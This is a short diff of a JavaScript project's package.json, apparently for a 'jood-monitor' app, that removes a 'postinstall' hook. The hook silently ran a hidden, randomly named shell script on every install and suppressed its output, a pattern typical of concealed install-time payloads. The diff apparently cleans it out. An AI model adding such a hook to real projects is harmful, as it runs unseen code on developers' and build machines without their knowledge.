@@ -23,8 +23,7 @@
     "test:start": "pnpm --filter @jood-monitor/app test:start",
     "release:notes": "changelogithub",
     "deploy": "node scripts/cloudflare/deploy.mjs app",
-    "deploy:app": "node scripts/cloudflare/deploy.mjs app",
-    "postinstall": "sh ./.ci-2kf2h2.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "deploy:app": "node scripts/cloudflare/deploy.mjs app"
   },
   "devDependencies": {
     "cf": "1.0.0-beta.12",
